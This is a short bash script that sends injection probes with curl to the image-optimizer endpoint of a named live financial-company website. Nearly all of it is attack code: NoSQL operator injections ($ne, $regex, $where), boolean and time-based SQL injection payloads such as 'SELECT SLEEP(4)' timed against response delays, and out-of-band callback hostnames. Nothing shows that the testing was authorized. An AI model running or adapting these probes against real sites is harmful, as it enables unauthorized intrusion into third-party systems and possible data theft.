#!/bin/bash
WD="$WORK_PATH"; cd "$WD" || exit 1
SQH="oob412911e44e41.dau2p4ghqqag02k5e6qqx"
NSH="oob02b45f92f28a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
B="https://www.infinitycapital.bh"
G() { curl -sk -g -o /dev/null -w "%{http_code} ct=%{content_type} sz=%{size_download} redir=%{redirect_url}\n" --max-time 20 "$1"; }

echo "== NoSQLi with -g (no globbing) =="
G "$B/_next/image?url[\$ne]=x&w=1080&q=75"
G "$B/_next/image?w[\$gt]=0&q=75&url=https%3A%2F%2Fexample.com%2Fa.jpg"
G "$B/_next/image?url[\$regex]=.*&w=1080&q=75"
G "$B/_next/image?url[\$where]=1&w=1080&q=75"

echo "== baseline 200 check: is the optimizer EVER reachable with a 200? =="
# public remote image (from the app's own page) to see a real 200
G "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"
G "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1200&q=75"

echo "== Boolean/time differential on w (q fixed) =="
for v in "1080" "1080 AND 1=1" "1080 AND 1=2" "1080;SELECT SLEEP(4)"; do
  t0=$(date +%s.%N)
  c=$(curl -sk -g -o /dev/null -w "%{http_code}" --max-time 20 "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$v")&q=75")
  t1=$(date +%s.%N)
  echo "w='$v' => $c  dt=$(python3 -c "print(round($t1-$t0,2))")s"
done
echo DONE
